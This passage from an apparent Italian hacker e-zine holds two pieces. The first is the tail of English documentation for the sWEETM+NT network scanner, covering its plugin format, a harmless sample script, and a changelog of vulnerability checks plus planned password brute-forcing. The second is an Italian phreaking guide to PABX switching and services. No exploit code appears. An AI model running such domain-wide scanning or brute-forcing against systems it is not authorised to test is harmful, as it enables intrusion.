But of course I can't be always working on this thingie.
So, when dedicated users will start to appear (if it will ever be), they'll
be able to add their ideas and functions to the tool.
As plugins.
I think you all know programs like Adobe Photoshop or Jasc's Paint Shop Pro
on the Winsux platform, they both make use of plugins to extend their
ability of processing image files. Here happens the same, with plugins you
can extend the capabilities of all the show.
Plugins accept parameters, do something and then return informations.
That's all.

3.2 - Using plugins

To use plugins, the file 'plugins.conf' must exist in the same dir as the
main sweetmint executable. Also on command line the parameter 'x' must be
specified.
In the plugins configuration file it's pointed out in which directory
sWEETM+NT should look for all the necessary files, feel free to change
that, as long as you move all the files you find in the standard dir.
Usually you won't need to make any changes to the configuration file,
except maybe the status of the plugin (i.e. if it must be executed or not),
that can be changed by looking for a 'PLUGINNAME_status' row and writing
there 'disable' or 'enable'.
All other parameters are set up by plugin's creator, and should be left
unchanged, unless you read somewhere that you can tune up something.
Don't blame anyone if after some mess up the plugin, or the whole program,
stops working.

3.3 - Writing your own plugin

A plugin can be written in any language you like, and can make use of any
kind of resource on the local system. The main program doesn't do any check
to see if the plugin can be run without hassle and locks-up, so it's up you
to make sure *within* the plugin code if everything will be fine. Usually
this is accomplished by making a bash script that takes care of all the
initialization stuff and then passes parameters to the main plugin
executable. You can also do all the dirty work with a bash script, I don't
care of which language you use.

The first thing you need to do is to write plugin specification in the
'plugins.conf' configuration file. A sample specification should look like
this:

startplugin--SAMPLE
SAMPLE_status=disable
SAMPLE_id=Sample plugin for sWEETM+NT - by \sPIRIT\
SAMPLE_file=sample.plugin
SAMPLE_params=currentHOST resultsFILE temporaryDIR
SAMPLE_type=single
SAMPLE_level=user
SAMPLE_disable=
endplugin--SAMPLE

You can put comments everywhere you like, adding a '#' at the beginning of
the text line.
Let's look in-depth what do all those names do:

- The two rows 'startplugin--NAME' and 'endplugin--NAME' must open and
  close all the other specifications, you can't write parameters outside
  those two delimiters. They are used to extract the plugin name and to
  associate options to the plugin.

- 'NAME_status' is the only parameter that should be changed by an
  end-user. It tells sWEETM+NT that the plugin should be run (enable) or
  not (disable).

- 'NAME_id' is simply a string of text that will be show to the user when
  the plugin is loaded. I use it to put some auto-celebration shots.
  The max lenght of the _id line is this:
  --------------------------------------------[ Max length of ID string ]->

- 'NAME_file' indicates the main executable sWEETM+NT will run, it must be
  located in the specified plugins directory, and then can run everything
  he wants (if you need some other programs).

  *IMPORTANT*
  Remember that the main working directory (also for plugins) is the one in
  which you run sWEETM+NT, so it's a good thing to specify full local
  pathnames in your plugins, keeping the main dir (ex. sweetmint/ ) as the
  base.

- 'NAME_params' is the most important field. Here you will write the
  command line parameters that will be given to plugin. There are no
  limitations, as long as you provide them on one line and in the order the
  plugin will look for.

  Also, there are some standard parameters that will be expanded by
  sWEETM+NT BEFORE spawning the process to the plugins, so you'll be sure
  you'll get exactly what you want. These parameters are (capitalization
  COUNTS):

  'currentHOST' will be expanded to the numeric IP or HOSTNAME that's
                currently being scanned.

  'resultsFILE' will be expanded to the name of the log results file, where,
                following a kind rule of law and order, you will write all
                the things your plugin will find. As I already pointed out,
                the name is referred as being in the MAIN directory, not in
                the plugins' one.

  'completeLIST' will be expanded to the name of the file containing the
                 full list of machines to be checked in the domain specified
                 on sWEETM+NT command line. It also refers to a file in the
                 MAIN directory.

  'completeIPLIST' will be expanded to the name of the file containing the
                   full list of machines to be checked IN THEIR DOTTED QUAD
                   FORMAT (neverthless of what contained the complete list,
                   IP's or hostnames). Il also refers to a file in the
                   MAIN directory.

  'pluginsDIRECTORY' will be expanded to the name of the dir in which
                     plugins and their files are stored WITHOUT THE TRAILING
                     SLASH '/'. Apply the usual rule of the main directory
                     as the base one.

  'temporaryDIR' will be expanded to the name of the current scan related
                 temporary directory, without the '/' as before. It's a good
                 thing to use it to store all the temporary files you'll
                 generate during the execution, as the dir will be removed
                 as soon as the scan is finished. Apply the usual rule of
                 main dir as the base.

- 'NAME_type' tells sWEETM+NT which kind of plugin it is. Currently you
  have three plugin types available:

  'single' is a plugin that works on a single IP or HOSTNAME, and will be
           executed in the main scan loop.

  'list' is a plugin that works on the full machines list, and will be
         executed after the main scan loop.
         Note that this kind of plugins AREN'T EXECUTED if scanning a single
         host.

  'post' is a plugin that does some things AFTER the scan is finished, like
         messing up with the results file and other non-scan related stuff.

- 'NAME_level' contains the privileges the plugin should be run with. It
               can be 'user' or 'root'. If the privilege requirement is not
                met, the plugin won't be run.

- 'NAME_disable' tells sWEETM+NT which internal functions the plugin
                 substitutes. This is a bitch.
                 In fact, you can turn off internal function of the main
                 tool specifying here which one your plugin substitutes.
                 Of course you can't TURN ON something.
                 It is performed by writing here the letters that
                 correspond to internal functions, same as on commandline.
                 But warning, there are some you can turn off, some you
                 can't. Here is a list of all the functions you can turn
                 off (writing the letter in this field, without the ''):

                 'f' --> Remote mountable directories
                 'c' --> Check for CGI exploits
                 'w' --> Wingate scanning
                 's' --> Netbios shared resources scan
                 'r' --> Collect RPC informations
                 'b' --> Collect BIND version
                 'B' --> Check for BIND exploits
                 'F' --> Collect FINGER informations
                 'N' --> Collect NIS maps listing
                 'd' --> Dump greet banners
                 'R' --> RUSERS info collection
                 't' --> Broadcast scanning
                 'T' --> .TAR.GZipping of results
                 'i' --> Linux IMAP bug check
                 'S' --> SMTP and POP3 bugs check

One important thing: NEVER leave any field blank, except for 'NAME_disable'
if you don't want to disable any of the internal functions. And, please,
don't add spaces after or before the '='.

Now that you know how to write the plugins specifications, let's spend some
words about the plugins themselves. As I already said, you can write the
plugin in any language you like, and make use of any resource, as long as
you perform some checks to ensure that everything will go fine.
You create your program, and then put it in the plugins directory. It's a
good rule to call it something like 'NAME.plugin', just to be more coherent
to the style I chose :)
Let's see the sample plugin I included in this distribution. You will find
it in the plugins dir and it's named 'sample.plugin'. It's a bash script,
and it's disabled in the plugins config file. Besides that, it doesn't do
anything relevant, so feel free to enable it, just to see how it's working.

------------------------<sample.plugin - cut here>--------------------------

# Sample plugin for sWEETM+NT - by \sPIRIT\ -s0ftpr0ject 98-
# It really doesn't do much... just for learning' sake.
# 
# Parameters passed (in the correct order):
# (hope you know something about passing parameters to scripts)
#
# $1 --> currentHOST
# $2 --> resultsFILE
# $3 --> pluginsDIRECTORY
# $4 --> temporaryDIR
# $5 --> dummy

echo "Sample plugin for sWEETM+NT - by \sPIRIT\"
echo " "
echo "Plugin is located in $3/ directory"
echo "Plugin is processing host: $1"
echo "Plugin sample.plugin rocks!" >> $2
echo "$5" >> $4/sample.plugin.log

cat $4/sample.plugin.log

exit 0

------------------------<sample.plugin - cut here>--------------------------

Let's have a look at it.
The first eleven rows are, obviously, comments. There are described the
command line parameters in the order they are passed.
All those "echo" rows show the usage of parameters.
In row "Plugin is located in $3/ directory" will be expanded to (with
default configuration) "plugins/". "Plugin sample.plugin rocks!" will be
written in the scan log results file in main sWEETM+NT directory. Same for
the following row, where the word "dummy" (passed as parameter) will be
written to the scan temporary dir in the file "sample.plugin.log"
Now you should have understood how parameters work, and what means that
main dir chat I wrote before. ALWAYS refer to base sWEETM+NT dir when
dealing with files, and NOT TO plugins directory.

                                     -

                              [ A - Appendix ]

A.1 - Change log

 + means ADDED
 - means REMOVED
 ! means FIXED
 * means CHANGED

Version 0.8.0     first test of sWEETM+NT - revision of mAGIC! 0.7.3
                  I decided to keep the version number, and go from this
                  point on.
                                     -
Version 0.8.1     internal tests (not released)
                                     -
Version 0.8.2pre1 first beta release (beta testers only)
                                     -
Version 0.8.2     first public release of sWEETM+NT
                + much more friendlier command line interface than mAGIC!
                + total automatization of scan process
                + scan history file
                + readable on-disk result file generation
                * new portscanner binary
                  someone seems to like this tool, that's cool
                                     -
Version 0.8.2a  + dumping of banners on telnet, smtp, pop3 and ftp
                + QPOPPER bug scan
                + results now can be compressed in a .tar.gz archive
                                     -
Version 0.8.3   + -resume:<domain> option - resumes aborted domain scans
                ! some bugfixes
                + rusers info collection
                + broadcasts scanner
                                     -
Version 0.8.4   ! nice fixes here and there
                ! fixed dependencies of parameters on commandline
                + -single:<host> option - scans a single host rather than a
                  whole domain
                ! range of scanned ports raised to 1080
                                     -
Version 0.9.0a  + basic external plugins support
                                     -
Version 0.9.1   + support for 'root' userid plugins
                + support for 'post' type plugins
                + IMAP bug check
                + generic pop3 and smtp bu gcheck
                                     -
Version 0.9.4   ! now is possibile to lauch multiple sessions of sWEETM+NT on
                  different domains (doesn't mess up anymore)
                ! all temporary files moved to a domain.tmp/ dedicated dir

Version 1.0.0     first stable and usable release of sWEETM+NT
                ! fixed some bugs in plugins support
                + bKiSS pLUGIN (bROADkASTiNG sIMPLE sCANNER) 
                ! fixed resume of aborted scans
                ! fixed some other stuff

A.2 - What's coming

sWEETM+NT after version 1.0.0 will be regularly updated. There are some
things I want to add, including:

- Child spawn (a user-definable number of threads running on the same list,
  to improve dramatically a scan' speed).

- ANSI interface, or a menu-based one (using the DIALOG.SO lib).

- Brute forcing of remote user password using the RUSERS service and a
  dictionary.

- Check of remote OS

- Wingate scanner as a plugin

- Ability to read a list of domains to scan, just for automatization' sake.

- Checking of more and new remote bugs, more CGI's and other plugins.

- A much cleaner results log.

A.3 - Greetings

Oh I'm damn sure someone will be left out... doh

To s0ftpr0ject 98 - SMaster, |scacco|, InfectedMachine, Dr_Slump, Dashie
To all my brothers running in the Badlands
To all in the Hackingirls staff
To all the M00N Children
To Budah, the best betatester I've ever had. Keep tha boom boom cha man
To Lord Gothik, for too many reasons to list here
To Desdemona, Kalma, OPHY, ^^Susanna and |ENGEL|
To Kaos One, Deda, and the whole Homiecyde Prod.
To ]-KooG-[, ][ndigo and Black Berry
... to everyone else I forgot

A.4 - Contacting me

Yes, you can find me on the web. You can download the latest version, as
well as new plugins when they are ready.
You can also send me your plugins. I'll be happy to include it in the next
release of sWEETM+NT.
Point your browser to http://softpj98.bbk.org/sweetmint/
You can also email me, for questions, ideas and (much appreciated)
submitting new plugins, the address is immagika@usa.net

                                     -

                    - You have just tasted a sWEETM+NT -
                                  - EOF -


==============================================================================
----------------------------------[ PHREAKiNG ]-------------------------------
==============================================================================

-------------------------------[ GUiDA Ai PABX ]------------------------------
-----------------------------------[ pIGpEN ]---------------------------------

C0NSUM0: 1 bottiglia di Sprite
	 1 bottiglia di coca-cola da 2 L (come si viveva senza cocacola?)
	 2 kinder cereali
CANZ0NI ASC0LTATE: Strange World -- Iron Maiden
                   I Don't Want to Miss A Thing -- Aereosmith
ALBUM:		   1991  -- Lynyrd Skynyrd (yeahhh!!!)
		   LEGEND -- Lynyrd Skynyrd
        	   Hey StooPID :) -- Alice Cooper
		   W0rKingMan'S DeAd -- GrAtEfUL DeAd
DEDICATO A:        una ragazza che e' riuscita a farmi smettere di far hacking
		   e a farmi capire che nella vita ci sono dei valori :*
		   Hummm puo' qualkosa andarmi bene? I hope ....
SALUTi:		   JaXXx (odiare gli altri vuol dire odiare anche se stessi)
		   Skav/A|A (Thx ehehe I'm afraid to say g00dbye Skynyrd rulez)
		   sAMuRAi1 (ViVA SaPiEnTiNo !!!!)
SPECiAL FUCk:	   A tutti coloro che giudicano senza prima giudicare se stessi
		   A tutti coloro che non pensano con la propria mente
		   A tutti coloro che prendono l'iniziativa di giudicare senza
		   che nessuno abbia chiesto a loro di farlo e a tutti coloro 
		   che hanno pregiudizi.... possa la merda cascarvi addosso....
MUSiCA DEDiCATA A: Hey StooPID ---> a nessuno
                   - 1991 / Lynyrd Skynyrd -		   
		   PURE & SiMPLE -> a SMaster (per averti rotto tanto con questa
              			    canzone)
		   MaMa (Afraid to say Goodbye) -> Skav/A|A
		   It's a KiLLeR -> a PhoenYx (dopo aver letto il PHO DOC =)
		   Keeping the Faith -> a me stesso (per convincermi a restare
                                        almeno a scrivere per BFi) potrei anche
	               			dedicarmi I've seen enough come hacker,
                                        ma prefrisco questo song :) 
	           Money Man -> a mio padre che sogna di diventare ricco =)
		   Good Thing -> a tutti coloro che riescono a disintossicarsi
				 (qualsiasi cosa sia la loro droga)
	           - Legend / Lynyrd Skynyrd -
		   WHEN YOU G0T G00D FRIENDS -> a tutto lo staff di BFi :)
CANZONE ISPIRATRICE: Backstreet Crawler -- Lynyrd Skynyrd (1991)
---:---:---:---:---:---:---:---:---:---:---:---:---:---:---:---:---:---:---:---
----> iNTR0 <----
1.0.1. FUNZIONAMENTO DI UN GENERICO SISTEMA TELEFONICO
1.0.2. FUNZIONAMENTO DI UN PABX
----> COMMUTAZIONE <----
2.0.1. SDM (SPACE DIVISION MULTIPLEXING)
2.0.2. TDM (TIME DIVISION MULTIPLEXING)
2.0.3. FDM (FREQUENCY DIVISION MULTIPLEXING)
----> SERVIZI <-----
3.0.1. SERVIZI DI SISTEMA
3.0.2. SERVIZI DELL'OPERATORE
3.0.3. SERVIZI DELL'UTENTE
3.0.4. SERVIZI AVANZATI
---:---:---:---:---:---:---:---:---:---:---:---:---:---:---:---:---:---:---:---
----> iNTR0 <----
Come molti di voi sapranno, PABX e' acronimo di Private Auto(matic) Branch
eXchange e si indica con questo termine le centraline elettroniche o non
che permettono alcuni dei servizi fondamentali all'interno di un'azienda,
come ad esempio:

- un sistema di numerazione telefonica interna per i vari reparti (interni)
- un controllo del traffico dall'interno verso l'esterno e viceversa
- una completa elasticita' nella configurazione e gestione dei servizi.

Molto spesso si tende a dire che tutti i PABX sono elettronici, questo NON
e' vero, infatti l'Office 5 dell'Italtel e' un esempio di modello non
completamente elettronico come il PABX HTA 1-5 della DIAL.

Uno dei problemi maggiormente sentiti nell'ambito della telefonia e' 
quello relativo a come collegare vari apparecchi telefonici in modo tale
che sia possibile colloquiare tra TuTTi gli apparecchi.

L'esempio piu' classico e' quello dei dieci telefoni.
Noi vogliamo che ognuno di questi 10 apparecchi possa chiamare gli altri 9.

Il modo piu' spontaneo (ma anche piu' costoso) per risolvere questo
problema e' l'installazione di una linea per ogni coppia di telefoni.
Questa rete che si forma prende il nome, come anche in telematica, di rete
a maglie.
Da ogni computer partiranno quindi 9 canali: questo vuol dire che ci
saranno 90 linee !!! E al massimo cinque connessioni nello stesso momento!
Nessuno sara' cosi' pazzo da adottare un sistema del genere anche se ha i
suoi vantaggi, per esempio:

- all'interno del canale il messaggio, che sia analogico o digitale, viaggia 
  al sicuro visto che nessuno degli  altri 8 apparecchi puo' accedere a quella
  linea

- la linea (per il principio riportato nel punto precedente) e' sempre
  libera (anche se l'apparecchio potrebbero essere occupato da un'altra chiamata
  sulle altre linee)

Considerate tuttavia un'azienda con 19 reparti, questo vorrebbe dire che
ogni apparecchio telefonico dovrebbe avere 18 linee a disposizione !!! E
se poi quell'azienda decidesse di aggiungere un'altro apparecchio?
Vorrebbe dire che bisogna cambiare di nuovo tutto il sistema aggiungendo
1 linea ad ogni apparecchio e 19 a quello nuovo !!!

Gli svantaggi sono quindi:

- costi elevatissimi
- scarsa espandibilita' 
- difficolta' di gestione

1.0.1. FUNZIONAMENTO DI UN GENERICO SISTEMA TELEFONICO

Il sistema telefonico parte quindi su uno di quei concetti che e' stato
poi importato anche all'interno delle reti telematiche e cioe'
l'impossibilita' che in un determinato momento ogni apparecchiatura
richieda di stabilire una connessione con un altro apparecchio.
Questo si traduce dal punto di vista della comunicazione con una riduzione
delle linee e con uno o piu' canali di comunicazione a cui possono
accedere piu' apparecchiature telefoniche.
Nel fare un discorso di questo tipo bisogna rendersi conto pero' che sorge
un altro problema e cioe' quello di introdurre un meccanismo che si occupi
di:

- dare la linea a chi la richieda (mittente)
- collegare il mittente al destinatario 

Questo meccanismo prende il nome di selettore C.C. (Cercatore di
Chiamata) e permette quindi un sistema di "commutazione" degli apparecchi
sul canale di comunicazione.

Se avete chiari questi concetti, avete chiaro pure il funzionamento delle
centraline meccaniche che avvengono proprio tramite selettori.

1.0.2. FUNZIONAMENTO DI UN PABX

In un PABX tuttavia lo schema di funzionamento e' il seguente:


   Linee    O-----------|--------------------|-----------O    Linee
               Rete     |        Rete        |  Rete
            O-----------|         di         |-----------O
   Interne     Interna  |    Commutazione    |  Esterna       Esterne
            O-----------|--------------------|-----------O   
                                   |
                                   |
                                   |
                                   |
                             -------------
                             |    C.U.   |
                             -------------

La prima cosa che dovete notare e' la mancanza dei selettori, ma gia' il
nome stesso vi fa pensare a qualcosa di meccanico ed essendo i PABX
elettronici o semielettronici non troverete questi esserini.

La C.U. (Control Unit) non e' altro che l'Unita di Controllo ma non va
intesa come in informatica e quindi come quell'unita che costituisce uno
degli elementi dei microprocessori, bensi' come a quel meccanismo che si
occupa di raccogliere le segnalazioni ed elaborarle.

Per fare questo l'Unita' di Controllo sara' quindi costituita da un
processore (per gestire una quarantina di linee un Intel 8080 fa il suo
lavoro, addirittura trovate i mitici Z80A !!!), una memoria ROM, una
memoria RAM, vari supporti magnetici ecc....

----> COMMUTAZIONE <---- 
Sia i PABX che le centraline meccaniche, si basano su un principio che ho
gia' introdotto: quello della commutazione.
Esistono vari metodi di commutazione:

2.0.1. SDM (Space Division Multiplexing) 

In Italiano viene chiamata tecnica "a divisione di spazio" ed e' tipica
di tutte le centraline elettromeccaniche.
Essa e' caratterizzata dal fatto che gli apparecchi telefonici hanno a
disposizione a turno la linea di comunicazione e questa, una volta che sia stata
stabilita una connessione, resta assegnata per tutto il periodo della
conversazione e prende il nome di canale spaziale.
E' un sistema tipico pure dei Crossbar, attraverso a delle barre di
interconnessione si stabilisce una connessione tra delle linee orizzontali
e quelle verticali, costituite da degli interruttori che nel caso dei PABX
sono eletronici.

A,B,C = terminaz. telefoniche
/ = microinterruttori
* = connessione 
| = barre di interconnessione

                      1          2
 A    ----------------|---*------|------
                      | /        |
                      *          |
 B    ----------------|----------|------
                      | /        |
                      *          |
 C    ----------------|---*------|------ 
                      | /        |
                      *          |
 D    ----------------|- --------|------
                      .          . 
                      .          .
                      .          .
                      
1 ---> canale spaziale tra A e C

In questo esempio potete notare che nella barra di interconnessione numero 1
si e' stabilita una connessione tra la terminazione A e la C.
La tecnica SDM va bene fino a quando ci si trova a gestire un centinaio di
linee.

La domanda che ci si pone e': "Bisogna per forza tenere il canale spaziale
occupato per tutta la conversazione?"

Secondo il teorema del campionamento NO!

Riassunto in poche parole dice (tramite formula Fc= 2F) che il segnale
analogico di partenza e' noto anche se si conoscono campioni di esso a
patto che non ci sia un intervallo di tempo superiore a Tc=1/Fc=1/2F.

Ricapitolando e spiegando meglio:
 
- ogni segnale ha una banda 
- prendiamo la frequenza massima (F) del segnale

secondo il teorema sara' quindi sufficiente campionare il segnale stesso
ad una frequenza pari a due volte F, con la condizione del tempo gia'
riportata.

2.0.2. TDM (Time Division Multiplexing)

Questa tecnica parte dalla domanda che ci eravamo posti sopra e sfruttando
il teorema del campionamento trasforma i segnali analogici, in segnali
campioni tali quindi da rendere possibile la disponibilita' della linea.
Per fare questo occorrera' un convertitore:

A,B = telefoni
C = convertitore
-- = canale spaziale (nel segmento CC)
s.a.= segnali analogici
s.i.= segnali impulsivi

    s.a.              s.i.              s.a.   
 A ------ C ------------------------ C ------ B

Questo tipo di Pabx puo' essere:

+ ANALOGiCO costituito principalmente dai seguenti componenti:
	    - interfacce linee interne
	    - interfacce linee esterne	
	    - interfaccia posto operatore (P.O.)
	    - memoria di controllo
	    - comando centrale

+ NUMERiCO costituito da:
	    - comando centrale
	    - rete di connessione

Credo che non occorra spiegare i compiti di ciascuna parte, l'unica cosa
da aggiungere e' che il comando centrale viene spesso formato da due
elaboratori che trattano simultaneamente le informazioni confrontando
successivamente i risultati (microsincronizzazione), oppure i due
elaboratori sono predisposti a scambiarsi in caso di malfunzionamento
(master-slave) o ancora utilizzati per dividersi il carico di lavoro
(suddivisione di carico).


Per spiegare la parte successiva dovete pensare al segnale analogico, che
ha un andamento a sinusoide la quale e' caratterizzata da:

1) ampiezza:  la distanza fra i valori massimi delle ordinate della sinusoide
2) periodo:   la distanza fra due punti corrispondenti della sinusoide
3) frequenza: l'inverso del periodo 
4) fase:      la distanza tra l'origine della sinusoide e quella degli assi

La modulazione puo' essere:

1) di ampiezza: quando due valori vengono rappresentati con ampiezza diversa
2) di frequenza: quando due valori vengono rappresentati con periodo diverso
3) di fase: quando due valori vengono rappresentati da differenti sfasamenti
            dell'origine della sinusoide

 - PAM (Pulse Amplitude Modulation)

La modulazione impulsiva in ampiezza e' una tecnica di TDM che si ottiene
modulando in ampiezza i segnali, e' molto usata nei PABX.

 - PCM (Pulse Code Modulation)

La modulazione impulsiva a codice e' un'estensione del PAM, in quanto tale
messaggio (e cioe' quello modulato in ampiezza) viene manipolato in modo
che ad ogni impulso corrisponda un codice a 8 bit da inviare quindi sulla
linea. 
Questo metodo, basandosi su segnali digitali e' molto adatto per le
trasmissioni di dati. Naturalmente i convertitori saranno da analogico a
digitale e viceversa.

2.0.3 FDM (Frequency Division Multiplexing)

Con questa tecnica si utilizza una modulazione di frequenza in modo che il 
segnale analogico comprese nella banda 300 - 3400 Hz viene utilizzato per 
modulare una portante di 60 kHz.

Sintetizzando il tutto, la divisione di spazio e' utilizzata per PABX 
con al massimo 100/150 linee.
Per sistemi piu' grossi si preferisce la PAM o PCM al fine di ridurre le
connessioni fisiche.
Il PABX si e' ormai evoluto anche per sistemi ISDN al fine di adeguarsi
alle esigenze relative alla trasmissione di dati.

----> SERVIZI <-----
Passiamo ora ad esaminare i servizi offerti dai PABX.
Questi sono suddivisi in:

+ Servizi Di Sistema
+ Servizi Dell'Operatore
+ Servizi di Automazione

ecco come vengono riportati nel libro "Principi di telefonia elettronica"
(ho dovuto apportare delle modifiche per adeguare le varie opzioni ai
tempi)

3.0.1. SERVIZI DI SISTEMA

- ACCESSO E CONTROLLO DIFFERENZIATO

Questo serve  alla configurazione e a settare i permessi sui vari
"fasci" a secondo dell'interno, con la possibilita' pure di stabilire
eventuali utenti privilegiati a cui garantire delle funzioni aggiuntive.

- AUTODIAGNOSI 

sono dei programmi eseguiti durante la fase di accensione del sistema e
durante il suo funzionamento.
Esistono pure dei programmi di diagnostica software come per esempio
quello che consente di rimuovere chiamate bloccate dal punto di vista
software (roll-back). 

- BLOCCO TEMPORANEO DEI FASCI 

ha lo scopo di bloccare fasci di linee al fine di impedire chiamate
entranti e uscenti. I motivi per fare cio' possono essere tanti, per
esempio fare un test di altre linee, isolando quelle funzionanti. 

- CHIAMATA DIFFERENZIATA

Rende una chiamata esterna facilmente riconoscibile da una interna
attraverso una "bussata" differenziata tra le due chiamate.

- COLLEGAMENTI INTERCENTRALI

Il PABX deve fornire una vasta gamma di cavi (a 2, 4 fili) per mantenere
compatibilita' con i vari criteri di segnalazione.

- CONTEGGIO

Permette di rilevare gli scatti consumati dalle linee urbane (non
necessariamente dovete pensare ai PBX e quindi alle centraline
elettroniche della Telecom, pensate per esempio ai 144 ecc...)

- CONTROLLO ALLA TELESELEZIONE

Consente di classificare e controllare le chiamate interne, urbane,
distrettuali, interurbane, internazionali.

- CONTROLLO DI TEMPORIZZAZIONE

Questo meccanismo permette di escludere una linea dal traffico se per
esempio viene lasciato l'apparecchio sganciato, lo stesso vale per le
chiamate, se qualcuno telefona, trova occupato ma continua a tenere
su la cornetta, la linea viene esclusa dal traffico.

- DETTATURA CENTRALIZZATA

Consente ad un derivato di accedere ad un sistema di dettatura per la
trasmissione fonica di un messaggio a piu' persone contemporaneamente.

- DIAGNOSI REMOTA

Consente una manutenzione a distanza tramite segnalazioni di allarme.

- DOCUMENTAZIONE ADDEBITI E/O REGISTRAZIONI DELLE CHIAMATE

Questa prestazione consente la visualizzazione, per gli utenti sotto
controllo, del numero chiamato, della durata della chiamata, dell'ora e
del costo della chiamata stessa. Questi dati possono essere stampati su
stampante oppure possono essere inviati ad un computer per una successiva
elaborazione. Si puo' avere la sola registrazione delle chiamate senza il
costo di addebito e viceversa.

- IMPEGNO LINEE: Impegno ciclico/impegno prioritario

L'impegno ciclico e' quel metodo che permette di scavalcare guasti sulle linee.
L'impegno prioritario invece ha il vantaggio di separare il traffico entrante
da quello uscente.

- INTERCETTAZIONI PER ERRATA MANOVRA

Con questo sistema, un'errata manovra da parte dell'utente, viene deviata
all'operatore. Per esempio e' il caso del numero inesistente.

- MANIPOLAZIONI CIFRE

Un'ottima prestazione e' quella che permette di inserire o assorbire, e in
generale manipolare, una o piu' cifre dal codice entrante o da quello in
uscita. L'utilita' di questo servizio si riscontra soprattutto nei casi di
collegamenti intercentrali e in qualche caso legato alla selezione passante.

- MESSAGGI REGISTRATI

Consente la memorizzazione su nastro magnetico di un messaggio registrato
da inviare poi all'utente esterno perche' si colleghi con la centrale
privata. E' il servizio per esempio utilizzato nelle centrali pubbliche
per la segnalazione di cambio numero ....

- MISURA DI TRAFFICO

Consente la visualizzazione e la programmazione del traffico di linee
urbane e di giunzioni. 

- MUSICA SU ATTESA

Permette l'ascolto di una musichetta alle chiamate messe in attesa.

- NUMERAZIONE LIBERA

L'associazione tra un numero interno e circuito fisico e' completamente
libera e variabile da console. Pertanto la rinumerazione di un derivato
diventa un semplice comando eseguito da console senza la necessita' di
rieseguire i collegamenti fisici.

- NUMERAZIONE FLESSIBILE

La numerazione interna puo' essere flessibilmente a 2, 3, 4 o 5 cifre.
Puo' anche coesistere una numerazione di tipo misto.

- NUMERAZIONE UNIVOCA

Nel caso di collegamenti di centrali in satellizzazione. una numerazione a
quattro cifre, ad esempio, individua contemporaneamente la satellite e il
derivato all'interno della satellite. Non occorre uno specifico codice di
instradamento; in altre parole, tale codice e' compreso nel numero interno
del derivato.

- PASSWORD AMMINISTRATIVA

Di conoscenza dell'utente, consente la modifica dei dati di configurazionne, 
cui l'utente puo' essere abilitato, come ad esempio l'aggiornamento delle
liste di selezione abbreviata.
Tra l'altro l'operazione specifica di aggiornamento delle liste di selezione
abbreviata puo' essere fatta semplicemente dal posto operatore senza
l'impiego di una password.

- PASSWORD DI SISTEMA

E' una password  di livello superiore rispetto alla precedente che consente 
tutto cio' che consente la prima piu' le verifiche diagnostiche.

- PASSWORD TONI / PASSWORD DI DEBUG

Sono due password che non possono essere variate e che consentono di
variare i toni udibili nel microtelefono e di entrare nel debug del
sistema.

- PROTEZIONE DATI VIOLABILI

Il problema si pone per le memorie RAM che in caso di spegnimento o guasto
del loro sistema perdono il loro contenuto. Nei piccoli sistemi cio' si
risolve con delle batterie di backup con la dovuta autonomia per
consentire anche eventuali lunghi periodi di sosta.
L'alternativa e' corredare il PABX con un'unita' a nastro o meglio ancora
con una unita' a disco, ove riservare una copia dei dati contenuti in
memoria.

- RICERCA PERSONE

Questo servizio consente di interfacciare sistemi esterni di ricerca
persone realizzati via radio o con segnali luminosi ....

- RECOVERY AUTONOMO

Consiste nel ripristino automatico dei circuiti riparati e nella sua
registrazione. Risulta dunque particolarmente utile nel caso di guasti
intermittenti.

- SELEZIONE ABBREVIATA / LISTE DI SISTEMA
 
Offre la possibilita' di selezionare un codice abbreviato al posto
dell'intero numero esterno. A livello di sistema si possono formare delle
liste di selezione abbreviata cui gli utenti interni possono accedere.
E' opportuno che: 1) gli interni possano essere abilitati a una o piu'
liste di sistema; 2) nell'accedere ad una lista di sistema l'utente
interno possa superare le restrizioni imposte dalla sua classe di
abilitazione.
Esistono anche le liste (di selezione abbreviata) individuali come
prestazioni a livello utente.

- SELEZIONE MISTA (DECADICA E/O MULTIFREQUENZA)

Con questa opzione si possono impiegare, con qualsiasi combinazione,
apparecchi telefonici decadici, a disco o a tastiera, e apparecchi
telefoni a tastiera multifrequenza. Alcuni sistemi offrono la possibilita'
di impiegare apparecchi speciali a tastiera, con tasti funzione,
visualizzatori numerici, unita' viva-voce ecc...

- SELEZIONE PASSANTE

Possibilita' di chiamare direttamente un derivato interno della centrale
privata (conoscendone il numero interno) senza la necessita' di passare
dall'operatore.

- SERVIZI ALBERGHIERI

I PABX per alberghi hanno dei servizi particolari per poter soddisfare
esigenze particolari. Es. servizio sveglia automatica, stato delle camere.

- SERVIZIO NOTTE

Quando l'operatore e' assente il sistema passa in servizio notte su
comando dell'operatore stesso, oppure su comando automatico temporizzato.
Tutte le chiamate in arrivo vengono deviate su un apparecchio predefinito
o su un gruppo di apparecchi. Esistono diversi tipi di servizio notte.
Servizio notte generale. Tutte le chiamate entranti provenienti da
qualunque linea urbana vengono deviate a un apparecchio specifico o ad un
gruppo di apparecchi. L'apparecchio in servizio notte gode allora di
particolari prestazioni come ad esempio la possibilita' di inclusione per
gli annunci di urgenza.
Servizio notte singolo. Ogni linea urbana entrante ha in questo caso il
suo apparecchio notte sul quale terminano le chiamate. Vi e'
un'associazione stretta tra linea urbana e apparecchio interno.
Servizio notte d'avviso. Le chiamate entranti provocano una segnalazione
acustica e/o luminosa che avverte della presenza di una chiamata entrante.
Da un qualsiasi apparecchio e' possibile allora connettersi con la chiamata
entrante, previa formazione di un codice, ed eventualmente trasferirla.

- SERVIZIO RONDA

Costituisce un mezzo di controllo telefonico del servizio ronda.

- SICUREZZA SU LINEE PER TRASMISSIONI DATI

E' opportuno proteggere da eventuali inclusioni dell'operatore o degli
interni le linee urbane riservate a questo scopo.

- SINTESI VOCALE PER OPERATORI NON VEDENTI

E' un servizio che permette agli operatori non vedenti di ascoltare tutto
cio' che per i vedenti viene visualizzato.

- TELEFONO DI MANUTENZIONE

Occorre anche prevedere la possibilita' che la console di sistema si
guasti.
Da qui l'esigenza di poter configurare uno o piu' apparecchi interni come
apparecchi di manutenzione, da cui effettuare i controlli diagnostici piu'
importanti.

- TRASFERIMENTO DI EMERGENZA

In caso di grave guasto parziale o totale si puo' effettuare il
trasferimento parziale o totale di linee unrabe su apparecchi
predeterminati.

3.0.2. SERVIZI DELL'OPERATORE

- ACCODAMENTO DELLE CHIAMATE

La gestione delle chiamate relative al posto operatore implica
necessariamente la formazione e la gestione di code di chiamata.
Esistono diversi tipi di code: le code di chiamata di ritorno al posto
operatore per temporizzazione scaduta, le code di attesa comandata, le
